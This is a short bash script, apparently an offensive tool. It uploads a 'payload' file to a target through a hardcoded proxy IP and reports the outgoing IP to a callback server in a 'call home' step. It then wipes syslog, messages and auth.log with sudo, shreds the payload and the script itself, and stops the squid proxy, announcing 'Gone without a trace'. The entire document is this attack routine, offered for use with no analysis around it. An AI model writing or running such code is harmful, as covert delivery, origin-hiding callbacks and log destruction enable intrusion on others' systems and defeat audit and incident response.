#!/bin/bash

# Configuration
PROXY="http://138.197.11.134:3128"
DESTINATION="http://target.example.com/upload"
PAYLOAD="/path/to/your/file.txt"
CALLBACK_URL="http://yourserver.example.com/report"
CALLBACK_MESSAGE="Delivery successful from IP: "

# Step 1: Deliver the payload
echo "Delivering payload to $DESTINATION..."
curl --proxy "$PROXY" --upload-file "$PAYLOAD" "$DESTINATION" -s -o /dev/null
if [ $? -eq 0 ]; then
    echo "Payload delivered successfully!"
else
    echo "Delivery failed!"
    exit 1
fi

# Step 2: Get the outgoing IP
IP=$(curl --proxy "$PROXY" http://httpbin.org/ip -s | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n 1)
echo "Used IP: $IP"

# Step 3: Call home
curl --proxy "$PROXY" -X POST -d "$CALLBACK_MESSAGE$IP" "$CALLBACK_URL" -s -o /dev/null
if [ $? -eq 0 ]; then
    echo "Reported back to $CALLBACK_URL!"
else
    echo "Callback failed!"
    exit 1
fi

# Step 4: Clean up and vanish
echo "Cleaning up and vanishing..."
# Clear system logs
sudo truncate -s 0 /var/log/syslog 2>/dev/null || true
sudo truncate -s 0 /var/log/messages 2>/dev/null || true
sudo truncate -s 0 /var/log/auth.log 2>/dev/null || true
# Delete the payload and self-destruct
shred -u "$PAYLOAD" 2>/dev/null || rm -f "$PAYLOAD"
shred -u "$0" 2>/dev/null || rm -f "$0"
echo "Poof! Gone without a trace."
sudo systemctl stop squid
exit 0